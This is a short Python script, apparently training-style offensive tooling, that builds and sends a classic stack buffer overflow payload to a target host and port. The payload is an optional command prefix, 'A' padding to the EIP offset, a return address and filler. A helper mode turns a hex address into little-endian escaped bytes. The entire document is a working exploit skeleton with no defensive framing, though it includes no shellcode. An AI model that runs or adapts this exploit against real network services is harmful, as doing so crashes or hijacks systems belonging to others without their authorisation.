#!/usr/bin/python

import socket
import time
import sys

if len(sys.argv) == 2:
    ret = sys.argv[1]

    ret = ret.lower()
    address = ""
    for i in range(len(ret)-1,-1,-2):
        address += "\\x" + ret[i-1] + ret[i]
    print(address)
    exit(0) 


if len(sys.argv) < 4:
    print("usage: \"python jump.py [target] [port] [eip]")
    print("usage: make sure to change the value of \"ret\"")
    print("usage: make sure to set a breakpoint at the jump address! as well!")
    exit(0)

target = sys.argv[1]
port = int(sys.argv[2])
eip = int(sys.argv[3])
ret = "change me!"

if len(sys.argv) == 5:
    cmd = sys.argv[4] + " "
else:
    cmd = ""

cmd = cmd.lstrip(" ")

if ret == "change me!":
    print("you need to change \"ret\" to the output of \"./jump.py [return address]\"")
    exit(0)

inputBuffer = cmd + "A" * eip + ret + "B" * 100
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print("sending buffer")
s.send(inputBuffer)
s.close()
exit(0)




